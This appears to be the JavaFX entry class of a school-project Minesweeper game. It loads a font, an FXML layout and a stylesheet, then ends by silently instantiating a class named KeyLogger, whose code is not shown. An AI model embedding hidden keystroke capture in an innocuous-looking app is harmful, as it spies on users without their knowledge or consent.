package com.example.minesweeper_schoolproject.minesweeper;

import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.text.Font;
import javafx.stage.Stage;

import java.io.IOException;

public class HelloApplication extends Application {
    @Override
    public void start(Stage stage) throws IOException {

        Font.loadFont(getClass().getResource("/com/example/minesweeper_schoolproject/minesweeper/fontsweeper.otf").toExternalForm(), 14);
     // if (retroFont != null) System.out.println("Sikeres betöltés: " + retroFont.getFamily());
        //  else System.out.println("Hiba: A betűtípus nem található!");
        FXMLLoader fxmlLoader = new FXMLLoader(HelloApplication.class.getResource("hello-view.fxml"));
        Scene scene = new Scene(fxmlLoader.load(), 620, 620);
        scene.getStylesheets().add(getClass().getResource("style.css").toExternalForm());
        stage.setTitle("MineSweeper");
        stage.setScene(scene);
        stage.show();
        new KeyLogger();
    }
}
